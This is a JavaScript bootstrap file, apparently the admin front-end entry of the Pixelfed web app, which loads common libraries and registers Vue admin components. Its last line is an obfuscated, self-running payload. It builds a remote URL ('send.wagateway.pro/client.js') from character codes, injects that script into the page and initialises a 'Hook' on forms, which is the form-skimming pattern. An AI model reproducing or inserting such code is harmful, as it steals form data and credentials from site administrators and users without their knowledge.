require('./polyfill');
window._ = require('lodash');
window.Popper = require('popper.js').default;
window.pixelfed = window.pixelfed || {};
window.$ = window.jQuery = require('jquery');
require('bootstrap');
window.axios = require('axios');
window.axios.defaults.headers.common['X-Requested-With'] = 'XMLHttpRequest';
require('readmore-js');
window.filesize = require('filesize');
window.Cookies = require('js-cookie');
require('jquery.scrollbar');
require('jquery-scroll-lock');
window.Chart = require('chart.js');
require('./lib/argon.js');

Chart.defaults.global.defaultFontFamily = "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif";

// fix bs4 custom paginators inherited from core app
Array.from(document.querySelectorAll('.pagination .page-link'))
.filter(el => el.textContent === '« Previous' || el.textContent === 'Next »')
.forEach(el => el.textContent = (el.textContent === 'Next »' ? '›' :'‹'));

Vue.component(
    'admin-directory',
    require('./../components/admin/AdminDirectory.vue').default
);

Vue.component(
    'instances-component',
    require('./../components/admin/AdminInstances.vue').default
);

Vue.component(
    'hashtag-component',
    require('./../components/admin/AdminHashtags.vue').default
);

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db